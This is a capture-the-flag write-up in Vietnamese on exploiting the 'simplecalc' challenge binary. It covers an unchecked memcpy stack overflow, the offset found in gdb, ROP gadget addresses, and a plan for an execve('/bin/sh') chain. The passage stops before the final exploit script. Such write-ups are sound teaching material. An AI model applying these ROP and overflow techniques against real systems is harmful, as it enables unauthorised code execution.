# simplecalc
```bash
┌──(grass㉿kali)-(~/pwn/insomiac/07-bof_static/bkp16_simplecalc)
└─$ file simplecalc 
simplecalc: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped
┌──(grass㉿kali)-(~/pwn/insomiac/07-bof_static/bkp16_simplecalc)
└─$ pwn checksec simplecalc 
[*] '/home/grass/pwn/insomiac/07-bof_static/bkp16_simplecalc/simplecalc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Hàm main của chương trình lấy được từ ghidra:
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  int v7; // edx
  int v8; // ecx
  int v9; // r8d
  int v10; // r9d
  int v12; // edx
  int v13; // ecx
  int v14; // r8d
  int v15; // r9d
  char v16; // [rsp+0h] [rbp-50h]
  char v17; // [rsp+0h] [rbp-50h]
  char v18[40]; // [rsp+10h] [rbp-40h] BYREF
  int v19; // [rsp+38h] [rbp-18h] BYREF
  int v20; // [rsp+3Ch] [rbp-14h] BYREF
  __int64 v21; // [rsp+40h] [rbp-10h]
  int i; // [rsp+4Ch] [rbp-4h]

  v20 = 0;
  setvbuf(stdin, 0LL, 2LL, 0LL);
  setvbuf(stdout, 0LL, 2LL, 0LL);
  print_motd();
  printf((unsigned int)"Expected number of calculations: ", 0, v3, v4, v5, v6, (char)argv);
  _isoc99_scanf((unsigned int)"%d", (unsigned int)&v20, v7, v8, v9, v10, v16);
  handle_newline();
  if ( v20 <= 255 && v20 > 3 )
  {
    v21 = malloc(4 * v20);
    for ( i = 0; i < v20; ++i )
    {
      print_menu();
      _isoc99_scanf((unsigned int)"%d", (unsigned int)&v19, v12, v13, v14, v15, v17);
      handle_newline();
      switch ( v19 )
      {
        case 1:
          adds();
          *(_DWORD *)(v21 + 4LL * i) = dword_6C4A88;
          break;
        case 2:
          subs();
          *(_DWORD *)(v21 + 4LL * i) = dword_6C4AB8;
          break;
        case 3:
          muls();
          *(_DWORD *)(v21 + 4LL * i) = dword_6C4AA8;
          break;
        case 4:
          divs();
          *(_DWORD *)(v21 + 4LL * i) = dword_6C4A98;
          break;
        case 5:
          memcpy(v18, v21, 4 * v20);
          free(v21);
          return 0;
        default:
          puts("Invalid option.\n");
          break;
      }
    }
    free(v21);
    return 0;
  }
  else
  {
    puts("Invalid number.");
    return 0;
  }
}
```
Ta thấy hàm này bắt đầu với việc yêu cầu chúng ta nhập vào số lươngj phép toán với string `Expected number of calculations:` rồi lưu vào bên trong v20. Sau đó chương trình kiểm tra để `v20` phải nằm trong khoảng từ 3 đến 255.
Sau đó chương trình cấp phát bộ nhớ cho từng phép tính, ở đây mỗi phép tính được cấp phát 4 bytes


Các hàm add, mul, sub, div có vẻ tương tự nhau. Chúng đều yêu cầu 2 số nhập vào phải lớn hơn hoặc bằng 40. Nếu không sẽ chửi ct và thoát chương trình
Trong chương trình này, bug có vẻ nằm ở trong `case 5`, nơi chúng ta save và exit chương trình:
```c
case 5:
          memcpy(v18, v21, 4 * v20);
          free(v21);
          return 0;
```
Nếu chúng ta chọn tùy chọn này, nó sẽ sử dụng memcpy để sao chép tất cả các phép tính của chúng ta vào vulnBuf. Vấn đề là nó không thực hiện kiểm tra kích thước, vì vậy nếu chúng ta có đủ phép tính, chúng ta có thể tràn bộ đệm và ghi đè địa chỉ trả về (không có ngăn xếp canary nào để ngăn chặn điều này). 
decompile hàm memcpy(), ta có:
```c

```
Ta bắt đầu bằng cách đặt điểm dừng ngay sau lệnh gọi memcpy.
```bash
┌──(grass㉿kali)-(~/pwn/insomiac/07-bof_static/bkp16_simplecalc)
└─$ gdb-gef ./simplecalc
gef➤  b *0x000000000040154a
Breakpoint 1 at 0x40154a
gef➤  r
Starting program: /home/grass/pwn/insomiac/07-bof_static/bkp16_simplecalc/simplecalc 

	|#------------------------------------#|
	|         Something Calculator         |
	|#------------------------------------#|

Expected number of calculations: 50
Options Menu: 
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 1
Integer x: 16111312
Integer y: 16111312
Result for x + y is 32222624.

Options Menu: 
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 5
gef➤  search-pattern 0x1EBADA0
[+] Searching '0x1EBADA0' in memory
gef➤  search-pattern 0x1ebada0
[+] Searching '0x1ebada0' in memory
gef➤  search-pattern 0x0000000001ebada0
[+] Searching '\xa0\xad\xeb\x01\x00\x00\x00\x00' in memory
[+] In '[heap]'(0x6c3000-0x6c6000), permission=rw-
  0x6c4a88 - 0x6c4aa8  →   "\xa0\xad\xeb\x01\x00\x00\x00\x00[...]" 
[+] In '[heap]'(0x6c6000-0x6e9000), permission=rw-
  0x6c8bf0 - 0x6c8c10  →   "\xa0\xad\xeb\x01\x00\x00\x00\x00[...]" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffaf98 - 0x7fffffffafb8  →   "\xa0\xad\xeb\x01\x00\x00\x00\x00[...]" 
  0x7fffffffdd30 - 0x7fffffffdd50  →   "\xa0\xad\xeb\x01\x00\x00\x00\x00[...]" 
gef➤  i f
Stack level 0, frame at 0x7fffffffdd80:
 rip = 0x40154a in main; saved rip = 0x0
 Arglist at 0x7fffffffdd70, args: 
 Locals at 0x7fffffffdd70, Previous frame's sp is 0x7fffffffdd80
 Saved registers:
  rbp at 0x7fffffffdd70, rip at 0x7fffffffdd78
```

Ta tính toán được offset giữa ret addr và giá trị `v20` là:
```bash 
>>> hex(0x7fffffffdd78 - 0x7fffffffdd30)
'0x48'
```
Để có thể ghi đè 0x48 bytes này ta cần đến 18 số kiểu int. 
Vì tệp nhị phân được liên kết tĩnh và không có PIE nên ta chỉ có thể xây dựng chuỗi rop bằng cách sử dụng chính file binary với những gì đã có (ret2text). Chuỗi ROP về cơ bản sẽ chỉ tạo một cuộc gọi hàm execve("/bin/sh",0,0). Có bốn thanh ghi mà chúng ta cần kiểm soát
```
rax:  0x3b              Specify execve syscall
rdi:  ptr to "/bin/sh"  Specify file to run
rsi:  0x0               Specify no arguments
rdx:  0x0               Specify no environment variables
```
Để làm được điều này, trường hợp tốt nhất là chúng ta tìm được các ropgadget như là `pop rax; ret`. 
Chúng ta cũng cần một gadget để lưu string "/bin/sh" vào một vùng nhớ nào đó mà ta đã biết.

```bash
┌──(grass㉿kali)-(~/pwn/insomiac/07-bof_static/bkp16_simplecalc)
└─$ ROPgadget --binary simplecalc | grep "pop rax ; ret"
0x000000000044db34 : pop rax ; ret

┌──(grass㉿kali)-(~/pwn/insomiac/07-bof_static/bkp16_simplecalc)
└─$ ROPgadget --binary simplecalc | grep "pop rsi ; ret"
0x0000000000437aa9 : pop rdx ; pop rsi ; ret

┌──(grass㉿kali)-(~/pwn/insomiac/07-bof_static/bkp16_simplecalc)
└─$ ROPgadget --binary simplecalc | grep "pop rdi ; ret"
0x0000000000401b73 : pop rdi ; ret
```

Tiếp theo là tìm `syscall`. Lưu ý là lời gọi hệ thống trong kiến trúc `x86_64` là `syscall` còn trong `x86` là `int 0x80`.
```bash
0x0000000000400488 : syscall
```

Để ghi được chuỗi "/bin/sh" vào một địa chỉ bất kì bên trong bộ nhớ, ta cần tìm thêm một ROPgadget nữa
```bash
┌──(grass㉿kali)-(~/pwn/insomiac/07-bof_static/bkp16_simplecalc)
└─$ ROPgadget --binary simplecalc | grep "mov" | grep "ret" | grep "ptr"
0x000000000044526e : mov qword ptr [rax], rdx ; ret
```
Ropgadget này hoạt động như sau: Lấy giá trị bên trong \$rdx ghi vào địa chỉ đang nằm bên trong thanh ghi \$rax.
Vậy chúng ta sẽ ghi "/bin/sh" vào đâu?
Kiểm tra memmory mappings khi chương trình đang hoạt động (lạy chúa thằng này k bật PIE)
```bash
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004c1000 0x0000000000000000 r-x /home/grass/pwn/insomiac/07-bof_static/bkp16_simplecalc/simplecalc
0x00000000006c0000 0x00000000006c3000 0x00000000000c0000 rw- /home/grass/pwn/insomiac/07-bof_static/bkp16_simplecalc/simplecalc
0x00000000006c3000 0x00000000006c6000 0x0000000000000000 rw- [heap]
0x00000000006c6000 0x00000000006e9000 0x0000000000000000 rw- [heap]
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
gef➤  x/20g 0x00000000006c0000
0x6c0000:	0x200e41280e41300e	0xe42100e42180e42
0x6c0010:	0xb4108	0xd0a40000002c
0x6c0020:	0x6cfffd1fd0	0x80e0a69100e4400
0x6c0030:	0xb42080e0a460b4b	0xe470b49080e0a57
0x6c0040:	0x8	0xd0d400000024
0x6c0050:	0x144fffd2010	0x5a020283100e4500
0x6c0060:	0xee3020b41080e0a	0x8
0x6c0070:	0xd0fc00000064	0x26cfffd2138
0x6c0080:	0xe47028f100e4200	0x48d200e42038e18
0x6c0090:	0x300e41058c280e42	0x440783380e410686
gef➤  x/20g 0x00000000006c1000
0x6c1000:	0x0	0x0
0x6c1010:	0x0	0x431070
0x6c1020:	0x430a40	0x428e20
0x6c1030:	0x4331b0	0x424c50
0x6c1040:	0x42b940	0x423740
0x6c1050:	0x4852d0	0x4178d0
0x6c1060:	0x0	0x0
0x6c1070 <_dl_tls_static_size>:	0x1180	0x0
0x6c1080 <_nl_current_default_domain>:	0x4945f7	0x0
0x6c1090 <locale_alias_path.10061>:	0x49462a	0x6c32a0
```

Trong bài này chúng ta sẽ chọn ghi vào vùng nhớ 
```bash 
0x00000000006c0000 0x00000000006c3000 0x00000000000c0000 rw- /home/grass/pwn/insomiac/07-bof_static/bkp16_simplecalc/simplecalc
```
vì chúng cho chúng ta quyền đọc và ghi `rw-`. Hơn nữa chúng được map từ file binary và không có PIE nên địa chỉ của vùng này là tĩnh (awesome)
ta thấy địa chỉ `0x6c1000` đang có giá trị là 0x0 nên ta có thể ghi vào đây mà không làm ảnh hưởng đến giá trị nào khác(trừ khi đống 0 đấy có ý nghĩa).

Còn 1 thứ cuối cùng chúng ta cần để tâm trước khi thực hiện sof. Mà điều này lại không được thể hiện rõ ràng trong IDA.
Sử dụng Ghidra, ta thấy ở giữa vulBuf[40] mà ở đây là `v18[40]` của chúng ta có một con trỏ calculation.
```c
  void *calculations;
  undefined vulnBuf [40];
  int calcChoice;
  int numberCalcs;
  int i;
```
mà ở bên dưới vùng nhớ này còn bị free:
```c
free(calculations);
```

tuy nhiên nhìn vào source code của hàm free ta thấy:
```c
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */
  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }
  if (mem == 0)                              /* free(0) has no effect */
    return;
}
```
Về cơ bản thì nếu hàm free được truyền vào tham số là 0 thì sẽ không có chuyện gì xảy ra cả. Nó sẽ chỉ return; Do vậy chúng ta chỉ cần làm đầy bộ nhớ từ input đến ret addr bằng null byte thì mọi thứ sẽ ổn
Từ đó ta có chương trình exploit.